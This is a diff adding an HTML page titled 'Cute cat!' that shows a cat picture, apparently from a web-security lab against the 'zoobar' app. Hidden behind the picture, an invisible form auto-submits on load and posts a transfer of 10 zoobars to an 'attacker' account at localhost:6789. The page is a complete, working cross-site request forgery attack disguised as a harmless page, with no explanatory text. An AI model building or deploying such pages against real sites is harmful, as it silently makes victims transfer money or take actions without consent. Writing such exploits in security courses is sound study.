@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><title>Cute cat!</title></head>
+<body>
+<h1>Look at this cat!</h1>
+<img src="https://cataas.com/cat" alt="cat">
+
+<iframe name="sink" style="display:none;width:0;height:0;border:0"></iframe>
+
+<form id="f" method="POST" action="http://localhost:6789/transfer.php" target="sink">
+  <input type="hidden" name="zoobars" value="10">
+  <input type="hidden" name="recipient" value="attacker">
+  <input type="hidden" name="submission" value="Send">
+</form>
+
+<script>
+document.getElementById("f").submit();
+</script>
+</body>
+</html>
